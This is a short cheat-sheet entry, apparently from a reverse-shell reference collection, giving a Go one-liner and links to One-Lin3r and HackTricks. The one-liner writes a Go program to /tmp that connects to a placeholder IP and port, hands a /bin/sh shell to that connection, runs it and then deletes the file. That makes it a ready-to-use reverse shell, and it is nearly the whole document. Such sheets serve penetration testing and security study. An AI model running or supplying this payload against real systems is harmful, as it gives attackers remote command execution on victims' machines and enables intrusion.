# Go

```go
$ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<IP>:<PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

---
## References

### Github

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)